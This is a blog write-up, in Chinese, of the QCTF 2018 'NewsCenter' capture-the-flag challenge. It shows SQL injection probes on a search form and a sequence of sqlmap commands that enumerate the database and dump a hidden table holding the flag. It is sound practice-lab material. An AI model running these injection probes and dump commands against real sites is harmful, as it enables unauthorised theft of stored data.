---
title: "QCTF-2018-NewsCenter-writeup"
categories: [ "CTF" ]
tags: [ "CTF","CTF writeup" ]
draft: false
slug: "12"
date: "2019-01-06 23:04:00"
---

- 为什么要写已经结束很久的题的 writeup：因为在做某 CTF 训练平台的题

首先打开网站，是一个搜索界面，随便搜索下，好像没什么反应：

![][1]

试试有没有注入：

- a'：空白界面
- a and 1=1：没返回内容
- a and 1=1 and '%'='%：没返回内容

好像没啥可注入的，那看下包吧，上 burp，发现是 post 发包：

![][2]

那么存为 1.txt，用 sqlmap 跑：
`python sqlmap.py -r 1.txt -p search --dbs`

![][3]

`python sqlmap.py -r 1.txt -p search -D news --tables`

![][4]

`python sqlmap.py -r 1.txt -p search -D news -T secret_table --columns`

![][5]

`python sqlmap.py -r 1.txt -p search -D news -T secret_table -C "fl4g,id" --dump`

![][6]

得到 flag：`QCTF{sq1_inJec7ion_ezzz}`

[1]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_230205.png
[2]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_230257.png
[3]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_231249.png
[4]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_231403.png
[5]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_231510.png
[6]: https://img.soapffz.com/archives_img/2019/01/06/archives_20190106_231903.png